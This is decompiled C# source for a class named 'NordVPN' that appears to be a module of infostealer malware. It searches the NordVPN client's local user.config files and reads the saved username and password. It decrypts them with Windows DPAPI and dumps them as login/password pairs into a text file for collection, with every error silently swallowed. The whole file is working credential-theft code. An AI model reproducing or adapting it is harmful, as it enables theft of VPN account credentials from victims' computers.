using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

// Token: 0x0200000A RID: 10
internal class NordVPN
{
	// Token: 0x06000016 RID: 22 RVA: 0x000034E8 File Offset: 0x000016E8
	public static void Start()
	{
		try
		{
			string text = "";
			string text2 = string.Format("{0}NordVPN", global::Buffer.path_l);
			if (!Directory.Exists(text2))
			{
				Directory.CreateDirectory(text2);
			}
			DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(global::Buffer.path_lad, "NordVPN"));
			if (directoryInfo.Exists)
			{
				DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
				for (int i = 0; i < directories.Length; i++)
				{
					DirectoryInfo[] directories2 = directories[i].GetDirectories();
					for (int j = 0; j < directories2.Length; j++)
					{
						string text3 = Path.Combine(directories2[j].FullName, "user.config");
						if (File.Exists(text3))
						{
							XmlDocument xmlDocument = new XmlDocument();
							xmlDocument.Load(text3);
							string text4 = xmlDocument.SelectSingleNode("//setting[@name='Username']/value").InnerText;
							string text5 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value").InnerText;
							text4 = ((!string.IsNullOrEmpty(text4)) ? NordVPN.Decrypt(text4) : null);
							text5 = ((!string.IsNullOrEmpty(text5)) ? NordVPN.Decrypt(text5) : null);
							if (!string.IsNullOrEmpty(text4) && !string.IsNullOrEmpty(text5))
							{
								text += "=====================================\n";
								text = text + "Login: " + text4 + "\n";
								text = text + "Password: " + text5 + "\n";
								text += "=====================================\n\n\n";
							}
						}
					}
				}
				if (!string.IsNullOrEmpty(text.Trim()))
				{
					File.WriteAllText("{path}\\NordVPN.txt", text.Trim().Replace("\n", Environment.NewLine));
				}
			}
			else
			{
				File.WriteAllText(string.Format("{0}\\data.txt", text2), string.Format("{0}", global::Buffer.head));
			}
		}
		catch
		{
		}
	}

	// Token: 0x06000017 RID: 23 RVA: 0x000036BC File Offset: 0x000018BC
	protected static string Decrypt(string str)
	{
		string result;
		try
		{
			result = Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(str), null, DataProtectionScope.LocalMachine));
		}
		catch
		{
			result = null;
		}
		return result;
	}
}
